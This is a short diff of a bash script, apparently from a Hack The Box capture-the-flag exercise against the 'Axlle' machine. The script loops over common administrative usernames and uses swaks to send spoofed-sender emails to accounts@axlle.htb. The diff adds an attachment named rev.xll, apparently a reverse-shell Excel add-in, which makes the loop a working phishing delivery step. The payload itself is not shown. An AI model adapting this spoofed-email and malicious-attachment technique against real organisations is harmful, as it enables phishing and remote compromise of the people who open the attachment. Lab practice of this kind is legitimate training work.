@@ -7,7 +7,6 @@ usernames=("root" "admin" "administrator" "webadmin" "sysadmin" "netadmin" "gues
 for user in "${usernames[@]}"
 do
     echo "Testing user: $user"
-    swaks --to accounts@axlle.htb --from "$user@axlle.htb" --header "Subject: Test Email" --body "Testing email to $user."
+    swaks --to accounts@axlle.htb --from "$user@axlle.htb" --attach @/home/parrot/Desktop/HackingLab/HackTheBox/Machines/Axlle/rev.xll --header "Subject: Test Email" --body "Testing email to $user." 
     echo
 done
-
